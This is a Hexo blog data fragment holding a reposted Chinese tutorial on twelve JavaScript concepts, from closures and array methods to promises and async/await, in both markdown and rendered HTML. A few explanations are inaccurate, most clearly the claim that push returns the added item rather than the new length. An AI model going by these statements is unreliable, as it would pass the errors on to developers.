map、filter、reduce\n\nmap：返回一个数组，其中每个元素都使用指定函数进行过转换。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst mapped = arr.map(el => el + 20);\nconsole.log(mapped);\n// [21, 22, 23, 24, 25, 26]\n```\n\nfilter：返回一个数组，只有当指定函数返回 true 时，相应的元素才会被包含在这个数组中。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst filtered = arr.filter(el => el === 2 || el === 4);\nconsole.log(filtered);\n// [2, 4]\n```\n\nreduce：基于给定函数累加值。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst reduced = arr.reduce((total, current) => total + current);\nconsole.log(reduced);\n// 21\n```\n### find、findIndex、indexOf\nfind：返回与指定条件匹配的第一个实例，不会继续查找其他匹配的实例。\n```js\nconst arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconst found = arr.find(el => el > 5);\nconsole.log(found);\n// 6\n```\n虽然 5 之后的元素都符合条件，但只返回第一个匹配的元素。\n\nfindIndex：这与 find 几乎完全相同，但不返回第一个匹配的元素，而是返回第一个匹配元素的索引。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.findIndex(el => el === 'Frank');\nconsole.log(foundIndex);\n// 1\n```\nindexOf：与 findIndex 几乎完全相同，但它的参数不是一个函数，而是一个简单的值。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.indexOf('Frank');\nconsole.log(foundIndex);\n// 1\n```\n### push、pop、shift、unshift\npush：这是一个相对简单的方法，它将一个项添加到数组的末尾。它就地修改数组，函数本身会返回添加到数组中的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst pushed = arr.push(5);\nconsole.log(arr);\n// [1, 2, 3, 4, 5]\nconsole.log(pushed);\n// 5\n```\npop：从数组中删除最后一项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst popped = arr.pop();\nconsole.log(arr);\n// [1, 2, 3]\nconsole.log(popped);\n// 4\n```\nshift：从数组中删除第一个项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst shifted = arr.shift();\nconsole.log(arr);\n// [2, 3, 4]\nconsole.log(shifted);\n// 1\n```\nunshift：将一个或多个元素添加到数组的开头。同样，它也是就地修改数组。与其他方法不同的是，函数本身返回数组最新的长度。\n```js\nlet arr = [1, 2, 3, 4];\nconst unshifted = arr.unshift(5, 6, 7);\nconsole.log(arr);\n// [5, 6, 7, 1, 2, 3, 4]\nconsole.log(unshifted);\n// 7\n```\n### splice、slice\nsplice：通过删除或替换现有元素或者添加新元素来修改数组的内容。这个方法也是就地修改数组。\n\n下面的代码示例的意思是：在数组的位置 1 上删除 0 个元素，并插入 b。\n```js\nlet arr = ['a', 'c', 'd', 'e'];\narr.splice(1, 0, 'b')\n```\nslice：从指定的起始位置和结束位置之前返回数组的浅拷贝。如果未指定结束位置，则返回数组的其余部分。这个方法不会修改数组，只是返回所需的子集。\n```js\nlet arr = ['a', 'b', 'c', 'd', 'e'];\nconst sliced = arr.slice(2, 4);\nconsole.log(sliced);\n// ['c', 'd']\nconsole.log(arr);\n// ['a', 'b', 'c', 'd', 'e']\n```\n### sort\nsort：根据提供的函数对数组进行排序。这个方法就地修改数组。如果函数返回负数或 0，则顺序保持不变。如果返回正数，则交换元素顺序。\n```js\nlet arr = [1, 7, 3, -1, 5, 7, 2];\nconst sorter = (firstEl, secondEl) => firstEl - secondEl;\narr.sort(sorter);\nconsole.log(arr);\n// [-1, 1, 2, 3, 5, 7, 7]\n```\n\n## 7. 生成器\n看到 * 不要害怕。生成器函数指定下一次调用 next() 时会生成什么 value。既可以生成有限数量的 value（最后调用 next() 会返回 undefined），也可以使用循环生成无限数量的 value。\n```js\nfunction* greeter() {\n  yield 'Hi';\n  yield 'How are you?';\n  yield 'Bye';\n}\nconst greet = greeter();\nconsole.log(greet.next().value);\n// 'Hi'\nconsole.log(greet.next().value);\n// 'How are you?'\nconsole.log(greet.next().value);\n// 'Bye'\nconsole.log(greet.next().value);\n// undefined\n```\n使用生成器生成无限个值：\n```js\nfunction* idCreator() {\n  let i = 0;\n  while (true)\n    yield i++;\n}\nconst ids = idCreator();\nconsole.log(ids.next().value);\n// 0\nconsole.log(ids.next().value);\n// 1\nconsole.log(ids.next().value);\n// 2\n// etc...\n```\n## 8. === 与 ==\n一定要知道 JavaScript 中 === 运算符和 == 运算符之间的区别！== 运算符在比较之前会进行类型转换，而 === 运算符在比较之前不会进行类型转换。\n```js\nconsole.log(0 == '0');\n// true\nconsole.log(0 === '0');\n// false\n```\n\n## 9. 对象比较\nJavaScript 新手容易犯的一个错误是直接比较对象。变量一般是指向内存中对象的引用，而不是对象本身！比较对象的一种方法是将它们转换成 JSON 字符串。但这样做有一个缺点：无法保证对象属性的顺序！一种更安全的方法是使用专门进行深度对象比较的库（例如 lodash 的 isEqual，https://lodash.com/docs#isEqual）。\n\n下面的对象看起来相同，但它们实际上指向不同的引用。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = { name: 'Joe' };\nconsole.log(joe1 === joe2);\n// false\n```\n相反，下面的结果为 true，因为使用其中一个对象为另一个对象赋值，它们都指向相同的引用（内存中只有一个对象）。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = joe1;\nconsole.log(joe1 === joe2);\n// true\n```\n## 10. 回调函数\n很多人都被 JavaScript 回调函数吓倒了！它们其实很简单，请看下面的例子。console.log 函数作为回调传给 myFunc，并在 setTimeout 完成时执行。\n```js\nfunction myFunc(text, callback) {\n  setTimeout(function() {\n    callback(text);\n  }, 2000);\n}\nmyFunc('Hello world!', console.log);\n// 'Hello world!'\n```\n## 11. promise\n一旦你理解了 JavaScript 回调，很快就会发现自己陷入了“回调地狱”中。这个时候可以使用 promise！将异步逻辑包装在 promise 中，使用“then”来处理成功的情况，使用“catch”来处理异常。\n```js\nconst myPromise = new Promise(function(res, rej) {\n  setTimeout(function(){\n    if (Math.random() < 0.9) {\n      return res('Hooray!');\n    }\n    return rej('Oh no!');\n  }, 1000);\n});\nmyPromise\n  .then(function(data) {\n    console.log('Success: ' + data);\n   })\n   .catch(function(err) {\n    console.log('Error: ' + err);\n   });\n\n// If Math.random() returns less than 0.9 the following is logged:\n// \"Success: Hooray!\"\n// If Math.random() returns 0.9 or greater the following is logged:\n// \"Error: On no!\"\n```\n## 12. Async/Await\n在掌握了 promise 的用法后，你可能也会喜欢 async await，它只是一种基于 promise 的“语法糖”。在下面的示例中，我们创建了一个 async 函数，并 await greeter promise。\n```js\nconst greeter = new Promise((res, rej) => {\n  setTimeout(() => res('Hello world!'), 2000);\n})\nasync function myFunc() {\n  const greeting = await greeter;\n  console.log(greeting);\n}\nmyFunc();\n// 'Hello world!'\n```\n\n# 后记\n[原文地址](https://mp.weixin.qq.com/s/lv55kP8MUboteMkV9basoQ)","source":"_drafts/2019-03-01-JavaScript的12个概念.md","raw":"---\ntitle: （转）理解这12个概念，让你的JavaScript开发更上一层楼\ntags:\n  - js\ncategories:\n  - 前端\n  - 转载\ndate: 2019-03-01 13:44:05\nupdated: 2019-03-01 13:44:05\n---\n\n# 概述\nJavaScript 是一门复杂的语言。如果你是一名 JavaScript 开发人员，不管处于什么样的水平，都有必要了解 JavaScript 的基本概念。本文介绍了 12 个非常重要的 JavaScript 概念，但绝对不是说 JavaScript 开发人员只需要知道这些就可以了。\n<!-- more -->\n\n# 详述\n## 1. 变量赋值（值与引用）\nJavaScript 总是按照值来给变量赋值。当指定的值是 JavaScript 的五种原始类型之一（即 Boolean、null、undefined、String 和 Number）时，将为变量分配实际的值。但是，当指定的值是 Array、Function 或 Object 时，将为变量分配内存的对象引用。\n\n在下面的代码段中，使用 var1 对 var2 赋值。由于 var1 是基本类型（String），因此 var2 的值等于 var1 的 String 值，但这个时候可以认为 var2 与 var1 完全不同。因此，重新为 var2 赋值对 var1 没有任何影响。\n\n```js\nlet var1 = 'My string';\nlet var2 = var1;\nvar2 = 'My new string';\nconsole.log(var1);\n// 'My string'\nconsole.log(var2);\n// 'My new string'\n```\n\n我们将它与对象赋值进行比较。\n\n```js\nlet var1 = { name: 'Jim' }\nlet var2 = var1;\nvar2.name = 'John';\nconsole.log(var1);\n// { name: 'John' }\nconsole.log(var2);\n// { name: 'John' }\n```\n如果你期望它会像原始类型赋值那样，很可能会出问题！如果你创建了一个无意中会改变对象的函数，就会出现一些非预期的行为。\n\n## 2. 闭包\n闭包是一种重要的 JavaScript 模式，可用于访问私有变量。在下面的示例中，createGreeter 返回一个匿名函数，这个函数可以访问参数 greeting（在这里是“Hello”）。在后续的调用中，sayHello 将有权访问这个 greeting！\n```js\nfunction createGreeter(greeting) {\n  return function(name) {\n    console.log(greeting + ', ' + name);\n  }\n}\nconst sayHello = createGreeter('Hello');\nsayHello('Joe');\n// Hello, Joe\n```\n在一个更真实的场景中，你可以设想一个初始化函数 apiConnect(apiKey)，它返回一些使用 API密钥的方法。在这种情况下，只需要提供一次 apiKey 即可。\n```js\nfunction apiConnect(apiKey) {\n  function get(route) {\n    return fetch(`${route}?key=${apiKey}`);\n  }\n  function post(route, params) {\n    return fetch(route, {\n      method: 'POST',\n      body: JSON.stringify(params),\n        headers: {\n          'Authorization': `Bearer ${apiKey}`\n        }\n      })\n  }\n  return { get, post }\n}\nconst api = apiConnect('my-secret-key');\n// No need to include the apiKey anymore\napi.get('http://www.example.com/get-endpoint');\napi.post('http://www.example.com/post-endpoint', { name: 'Joe' });\n```\n## 3. 解构\nJavaScript 参数解构是一种从对象中提取属性的常用方法。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name, food } = obj;\nconsole.log(name, food);\n// 'Joe' 'cake'\n```\n如果需要以其他名称来提取属性，可以使用以下格式来指定它们。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name: myName, food: myFood } = obj;\nconsole.log(myName, myFood);\n// 'Joe' 'cake'\n```\n在下面的示例中，解构被用来将 person 对象传给 introduce 函数。换句话说，解构可以（并且经常）直接用于提取传给函数的参数。如果你熟悉 React，可能已经见过这个！\n```js\nconst person = {\n  name: 'Eddie',\n  age: 24\n}\nfunction introduce({ name, age }) {\n  console.log(`I'm ${name} and I'm ${age} years old!`);\n}\nconsole.log(introduce(person));\n// \"I'm Eddie and I'm 24 years old!\"\n```\n\n## 4. 展开（spread）语法\n在下面的示例中，Math.max 不能直接接受 arr 数组，因为它的参数不是数组类型，但可以以数组中的各个元素作为参数。展开运算符... 可用于提取数组的各个元素。\n```js\nconst arr = [4, 6, -1, 3, 10, 4];\nconst max = Math.max(...arr);\nconsole.log(max);\n// 10\n```\n\n## 5. 变长参数（rest）语法\n你可以用它将传给函数的任意数量的参数放入数组中！\n```js\nfunction myFunc(...args) {\n  console.log(args[0] + args[1]);\n}\nmyFunc(1, 2, 3, 4);\n// 3\n```\n\n## 6. 数组方法\nJavaScript 数组方法通常可以为你提供令人难以置信的优雅方式来执行所需的数据转换。作为 StackOverflow 的贡献者，我经常看到有关如何以这种或那种方式操纵对象数组的问题。这往往是数组方法的完美用例。\n\n### map、filter、reduce\n\nmap：返回一个数组，其中每个元素都使用指定函数进行过转换。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst mapped = arr.map(el => el + 20);\nconsole.log(mapped);\n// [21, 22, 23, 24, 25, 26]\n```\n\nfilter：返回一个数组，只有当指定函数返回 true 时，相应的元素才会被包含在这个数组中。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst filtered = arr.filter(el => el === 2 || el === 4);\nconsole.log(filtered);\n// [2, 4]\n```\n\nreduce：基于给定函数累加值。\n```js\nconst arr = [1, 2, 3, 4, 5, 6];\nconst reduced = arr.reduce((total, current) => total + current);\nconsole.log(reduced);\n// 21\n```\n### find、findIndex、indexOf\nfind：返回与指定条件匹配的第一个实例，不会继续查找其他匹配的实例。\n```js\nconst arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconst found = arr.find(el => el > 5);\nconsole.log(found);\n// 6\n```\n虽然 5 之后的元素都符合条件，但只返回第一个匹配的元素。\n\nfindIndex：这与 find 几乎完全相同，但不返回第一个匹配的元素，而是返回第一个匹配元素的索引。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.findIndex(el => el === 'Frank');\nconsole.log(foundIndex);\n// 1\n```\nindexOf：与 findIndex 几乎完全相同，但它的参数不是一个函数，而是一个简单的值。\n```js\nconst arr = ['Nick', 'Frank', 'Joe', 'Frank'];\nconst foundIndex = arr.indexOf('Frank');\nconsole.log(foundIndex);\n// 1\n```\n### push、pop、shift、unshift\npush：这是一个相对简单的方法，它将一个项添加到数组的末尾。它就地修改数组，函数本身会返回添加到数组中的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst pushed = arr.push(5);\nconsole.log(arr);\n// [1, 2, 3, 4, 5]\nconsole.log(pushed);\n// 5\n```\npop：从数组中删除最后一项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst popped = arr.pop();\nconsole.log(arr);\n// [1, 2, 3]\nconsole.log(popped);\n// 4\n```\nshift：从数组中删除第一个项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。\n```js\nlet arr = [1, 2, 3, 4];\nconst shifted = arr.shift();\nconsole.log(arr);\n// [2, 3, 4]\nconsole.log(shifted);\n// 1\n```\nunshift：将一个或多个元素添加到数组的开头。同样，它也是就地修改数组。与其他方法不同的是，函数本身返回数组最新的长度。\n```js\nlet arr = [1, 2, 3, 4];\nconst unshifted = arr.unshift(5, 6, 7);\nconsole.log(arr);\n// [5, 6, 7, 1, 2, 3, 4]\nconsole.log(unshifted);\n// 7\n```\n### splice、slice\nsplice：通过删除或替换现有元素或者添加新元素来修改数组的内容。这个方法也是就地修改数组。\n\n下面的代码示例的意思是：在数组的位置 1 上删除 0 个元素，并插入 b。\n```js\nlet arr = ['a', 'c', 'd', 'e'];\narr.splice(1, 0, 'b')\n```\nslice：从指定的起始位置和结束位置之前返回数组的浅拷贝。如果未指定结束位置，则返回数组的其余部分。这个方法不会修改数组，只是返回所需的子集。\n```js\nlet arr = ['a', 'b', 'c', 'd', 'e'];\nconst sliced = arr.slice(2, 4);\nconsole.log(sliced);\n// ['c', 'd']\nconsole.log(arr);\n// ['a', 'b', 'c', 'd', 'e']\n```\n### sort\nsort：根据提供的函数对数组进行排序。这个方法就地修改数组。如果函数返回负数或 0，则顺序保持不变。如果返回正数，则交换元素顺序。\n```js\nlet arr = [1, 7, 3, -1, 5, 7, 2];\nconst sorter = (firstEl, secondEl) => firstEl - secondEl;\narr.sort(sorter);\nconsole.log(arr);\n// [-1, 1, 2, 3, 5, 7, 7]\n```\n\n## 7. 生成器\n看到 * 不要害怕。生成器函数指定下一次调用 next() 时会生成什么 value。既可以生成有限数量的 value（最后调用 next() 会返回 undefined），也可以使用循环生成无限数量的 value。\n```js\nfunction* greeter() {\n  yield 'Hi';\n  yield 'How are you?';\n  yield 'Bye';\n}\nconst greet = greeter();\nconsole.log(greet.next().value);\n// 'Hi'\nconsole.log(greet.next().value);\n// 'How are you?'\nconsole.log(greet.next().value);\n// 'Bye'\nconsole.log(greet.next().value);\n// undefined\n```\n使用生成器生成无限个值：\n```js\nfunction* idCreator() {\n  let i = 0;\n  while (true)\n    yield i++;\n}\nconst ids = idCreator();\nconsole.log(ids.next().value);\n// 0\nconsole.log(ids.next().value);\n// 1\nconsole.log(ids.next().value);\n// 2\n// etc...\n```\n## 8. === 与 ==\n一定要知道 JavaScript 中 === 运算符和 == 运算符之间的区别！== 运算符在比较之前会进行类型转换，而 === 运算符在比较之前不会进行类型转换。\n```js\nconsole.log(0 == '0');\n// true\nconsole.log(0 === '0');\n// false\n```\n\n## 9. 对象比较\nJavaScript 新手容易犯的一个错误是直接比较对象。变量一般是指向内存中对象的引用，而不是对象本身！比较对象的一种方法是将它们转换成 JSON 字符串。但这样做有一个缺点：无法保证对象属性的顺序！一种更安全的方法是使用专门进行深度对象比较的库（例如 lodash 的 isEqual，https://lodash.com/docs#isEqual）。\n\n下面的对象看起来相同，但它们实际上指向不同的引用。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = { name: 'Joe' };\nconsole.log(joe1 === joe2);\n// false\n```\n相反，下面的结果为 true，因为使用其中一个对象为另一个对象赋值，它们都指向相同的引用（内存中只有一个对象）。\n```js\nconst joe1 = { name: 'Joe' };\nconst joe2 = joe1;\nconsole.log(joe1 === joe2);\n// true\n```\n## 10. 回调函数\n很多人都被 JavaScript 回调函数吓倒了！它们其实很简单，请看下面的例子。console.log 函数作为回调传给 myFunc，并在 setTimeout 完成时执行。\n```js\nfunction myFunc(text, callback) {\n  setTimeout(function() {\n    callback(text);\n  }, 2000);\n}\nmyFunc('Hello world!', console.log);\n// 'Hello world!'\n```\n## 11. promise\n一旦你理解了 JavaScript 回调，很快就会发现自己陷入了“回调地狱”中。这个时候可以使用 promise！将异步逻辑包装在 promise 中，使用“then”来处理成功的情况，使用“catch”来处理异常。\n```js\nconst myPromise = new Promise(function(res, rej) {\n  setTimeout(function(){\n    if (Math.random() < 0.9) {\n      return res('Hooray!');\n    }\n    return rej('Oh no!');\n  }, 1000);\n});\nmyPromise\n  .then(function(data) {\n    console.log('Success: ' + data);\n   })\n   .catch(function(err) {\n    console.log('Error: ' + err);\n   });\n\n// If Math.random() returns less than 0.9 the following is logged:\n// \"Success: Hooray!\"\n// If Math.random() returns 0.9 or greater the following is logged:\n// \"Error: On no!\"\n```\n## 12. Async/Await\n在掌握了 promise 的用法后，你可能也会喜欢 async await，它只是一种基于 promise 的“语法糖”。在下面的示例中，我们创建了一个 async 函数，并 await greeter promise。\n```js\nconst greeter = new Promise((res, rej) => {\n  setTimeout(() => res('Hello world!'), 2000);\n})\nasync function myFunc() {\n  const greeting = await greeter;\n  console.log(greeting);\n}\nmyFunc();\n// 'Hello world!'\n```\n\n# 后记\n[原文地址](https://mp.weixin.qq.com/s/lv55kP8MUboteMkV9basoQ)","slug":"2019-03-01-JavaScript的12个概念","published":0,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8oh000mwovv58m97ixv","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>JavaScript 是一门复杂的语言。如果你是一名 JavaScript 开发人员，不管处于什么样的水平，都有必要了解 JavaScript 的基本概念。本文介绍了 12 个非常重要的 JavaScript 概念，但绝对不是说 JavaScript 开发人员只需要知道这些就可以了。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"1-变量赋值（值与引用）\"><a href=\"#1-变量赋值（值与引用）\" class=\"headerlink\" title=\"1. 变量赋值（值与引用）\"></a>1. 变量赋值（值与引用）</h2><p>JavaScript 总是按照值来给变量赋值。当指定的值是 JavaScript 的五种原始类型之一（即 Boolean、null、undefined、String 和 Number）时，将为变量分配实际的值。但是，当指定的值是 Array、Function 或 Object 时，将为变量分配内存的对象引用。</p>\n<p>在下面的代码段中，使用 var1 对 var2 赋值。由于 var1 是基本类型（String），因此 var2 的值等于 var1 的 String 值，但这个时候可以认为 var2 与 var1 完全不同。因此，重新为 var2 赋值对 var1 没有任何影响。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> var1 = <span class=\"string\">'My string'</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> var2 = var1;</span><br><span class=\"line\">var2 = <span class=\"string\">'My new string'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var1);</span><br><span class=\"line\"><span class=\"comment\">// 'My string'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var2);</span><br><span class=\"line\"><span class=\"comment\">// 'My new string'</span></span><br></pre></td></tr></table></figure>\n<p>我们将它与对象赋值进行比较。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> var1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Jim'</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> var2 = var1;</span><br><span class=\"line\">var2.name = <span class=\"string\">'John'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var1);</span><br><span class=\"line\"><span class=\"comment\">// &#123; name: 'John' &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var2);</span><br><span class=\"line\"><span class=\"comment\">// &#123; name: 'John' &#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果你期望它会像原始类型赋值那样，很可能会出问题！如果你创建了一个无意中会改变对象的函数，就会出现一些非预期的行为。</p>\n<h2 id=\"2-闭包\"><a href=\"#2-闭包\" class=\"headerlink\" title=\"2. 闭包\"></a>2. 闭包</h2><p>闭包是一种重要的 JavaScript 模式，可用于访问私有变量。在下面的示例中，createGreeter 返回一个匿名函数，这个函数可以访问参数 greeting（在这里是“Hello”）。在后续的调用中，sayHello 将有权访问这个 greeting！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createGreeter</span>(<span class=\"params\">greeting</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(greeting + <span class=\"string\">', '</span> + name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> sayHello = createGreeter(<span class=\"string\">'Hello'</span>);</span><br><span class=\"line\">sayHello(<span class=\"string\">'Joe'</span>);</span><br><span class=\"line\"><span class=\"comment\">// Hello, Joe</span></span><br></pre></td></tr></table></figure></p>\n<p>在一个更真实的场景中，你可以设想一个初始化函数 apiConnect(apiKey)，它返回一些使用 API密钥的方法。在这种情况下，只需要提供一次 apiKey 即可。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">apiConnect</span>(<span class=\"params\">apiKey</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span>(<span class=\"params\">route</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(<span class=\"string\">`<span class=\"subst\">$&#123;route&#125;</span>?key=<span class=\"subst\">$&#123;apiKey&#125;</span>`</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">post</span>(<span class=\"params\">route, params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(route, &#123;</span><br><span class=\"line\">      method: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">      body: <span class=\"built_in\">JSON</span>.stringify(params),</span><br><span class=\"line\">        headers: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Authorization'</span>: <span class=\"string\">`Bearer <span class=\"subst\">$&#123;apiKey&#125;</span>`</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123; get, post &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> api = apiConnect(<span class=\"string\">'my-secret-key'</span>);</span><br><span class=\"line\"><span class=\"comment\">// No need to include the apiKey anymore</span></span><br><span class=\"line\">api.get(<span class=\"string\">'http://www.example.com/get-endpoint'</span>);</span><br><span class=\"line\">api.post(<span class=\"string\">'http://www.example.com/post-endpoint'</span>, &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"3-解构\"><a href=\"#3-解构\" class=\"headerlink\" title=\"3. 解构\"></a>3. 解构</h2><p>JavaScript 参数解构是一种从对象中提取属性的常用方法。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Joe'</span>,</span><br><span class=\"line\">  food: <span class=\"string\">'cake'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; name, food &#125; = obj;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(name, food);</span><br><span class=\"line\"><span class=\"comment\">// 'Joe' 'cake'</span></span><br></pre></td></tr></table></figure></p>\n<p>如果需要以其他名称来提取属性，可以使用以下格式来指定它们。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Joe'</span>,</span><br><span class=\"line\">  food: <span class=\"string\">'cake'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"attr\">name</span>: myName, <span class=\"attr\">food</span>: myFood &#125; = obj;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(myName, myFood);</span><br><span class=\"line\"><span class=\"comment\">// 'Joe' 'cake'</span></span><br></pre></td></tr></table></figure></p>\n<p>在下面的示例中，解构被用来将 person 对象传给 introduce 函数。换句话说，解构可以（并且经常）直接用于提取传给函数的参数。如果你熟悉 React，可能已经见过这个！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> person = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">'Eddie'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">24</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">introduce</span>(<span class=\"params\">&#123; name, age &#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">`I'm <span class=\"subst\">$&#123;name&#125;</span> and I'm <span class=\"subst\">$&#123;age&#125;</span> years old!`</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(introduce(person));</span><br><span class=\"line\"><span class=\"comment\">// \"I'm Eddie and I'm 24 years old!\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-展开（spread）语法\"><a href=\"#4-展开（spread）语法\" class=\"headerlink\" title=\"4. 展开（spread）语法\"></a>4. 展开（spread）语法</h2><p>在下面的示例中，Math.max 不能直接接受 arr 数组，因为它的参数不是数组类型，但可以以数组中的各个元素作为参数。展开运算符… 可用于提取数组的各个元素。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">-1</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> max = <span class=\"built_in\">Math</span>.max(...arr);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(max);</span><br><span class=\"line\"><span class=\"comment\">// 10</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"5-变长参数（rest）语法\"><a href=\"#5-变长参数（rest）语法\" class=\"headerlink\" title=\"5. 